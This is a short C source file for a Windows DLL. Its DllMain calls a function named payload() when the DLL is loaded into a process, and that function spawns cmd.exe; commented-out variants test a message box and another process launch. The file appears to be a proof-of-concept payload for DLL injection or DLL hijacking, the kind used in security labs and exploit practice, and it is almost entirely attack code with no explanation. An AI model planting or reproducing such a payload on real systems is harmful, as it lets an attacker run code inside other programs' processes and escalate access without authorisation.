#include <processthreadsapi.h>
#include <memoryapi.h>

void payload()
{
    /*
    DWORD pid = GetCurrentProcessId();
    MessageBoxA(NULL, "Hello!", "PID", MB_OK);
    */

	/*
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    CreateProcess(L"(C:\Windows\System32\cmd.exe)", NULL, NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &info, &processInfo);
	*/
	
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
		  
	char cmd[] = "cmd.exe";
		  
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
		case DLL_PROCESS_ATTACH:
			payload();
			break;
		case DLL_THREAD_ATTACH:
			//payload();
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}